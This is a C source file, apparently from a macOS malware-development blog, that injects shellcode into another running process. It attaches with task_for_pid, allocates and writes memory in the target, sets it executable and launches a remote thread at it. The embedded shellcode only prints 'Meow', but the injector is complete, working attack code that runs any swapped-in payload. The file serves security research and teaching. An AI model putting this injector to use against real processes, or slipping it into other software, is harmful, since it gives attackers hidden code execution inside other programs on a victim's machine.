/*
 * hack.c
 * macOS x86_64 shellcode injection 
 * using task_for_pid and 
 * remote thread creation
 * author @cocomelonc
 * https://cocomelonc.github.io/macos/2025/08/22/malware-mac-10.html
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/thread_act.h>
#include <mach/thread_status.h>

unsigned char shellcode[] =
  "\x48\xb8\x4d\x65\x6f\x77\x0a\x00\x00\x00"
  "\x50\xbf\x01\x00\x00\x00"
  "\x48\x89\xe6\xba\x05\x00\x00\x00"
  "\xb8\x04\x00\x00\x02\x0f\x05"
  "\xb8\x01\x00\x00\x02\x48\x31\xff\x0f\x05";

int main(int argc, char *argv[]) {
  if (argc != 2) {
    fprintf(stderr, "usage: %s <pid>\n", argv[0]);
    return 1;
  }

  pid_t pid = atoi(argv[1]);
  task_t task;
  kern_return_t kr = task_for_pid(mach_task_self(), pid, &task);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "[-] task_for_pid() failed: %s\n", mach_error_string(kr));
    return 1;
  }
  printf("[+] attached to pid %d\n", pid);

  mach_vm_address_t remote_addr = 0;
  vm_size_t shellcode_size = sizeof(shellcode);

  kr = mach_vm_allocate(task, &remote_addr, shellcode_size, VM_FLAGS_ANYWHERE);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "[-] mach_vm_allocate failed: %s\n", mach_error_string(kr));
    return 1;
  }
  printf("[+] allocated memory at 0x%llx\n", remote_addr);

  kr = mach_vm_write(task, remote_addr, (vm_offset_t)shellcode, shellcode_size);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "[-] mach_vm_write failed: %s\n", mach_error_string(kr));
    return 1;
  }
  printf("[+] wrote shellcode\n");

  kr = mach_vm_protect(task, remote_addr, shellcode_size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "[-] mach_vm_protect failed: %s\n", mach_error_string(kr));
    return 1;
  }
  printf("[+] set memory protections to RX\n");

  // setup new thread state
  x86_thread_state64_t state;
  thread_act_t thread;
  mach_msg_type_number_t state_count = x86_THREAD_STATE64_COUNT;
  memset(&state, 0, sizeof(state));

  // set instruction pointer (rip) to our shellcode
  state.__rip = remote_addr;

  // stack pointer (rsp) should be valid; just allocate a dummy stack
  mach_vm_address_t remote_stack = 0;
  kr = mach_vm_allocate(task, &remote_stack, 0x1000, VM_FLAGS_ANYWHERE);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "[-] mach_vm_allocate (stack) failed: %s\n", mach_error_string(kr));
    return 1;
  }
  state.__rsp = remote_stack + 0x1000 - 8; // stack top aligned

  kr = thread_create_running(task,
    x86_THREAD_STATE64,
    (thread_state_t)&state,
    state_count,
    &thread);

  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "[-] thread_create_running failed: %s\n", mach_error_string(kr));
    return 1;
  }

  printf("[+] remote thread created at RIP=0x%llx, RSP=0x%llx\n", state.__rip, state.__rsp);
  printf("[+] shellcode running in PID %d via new thread.\n", pid);

  return 0;
}
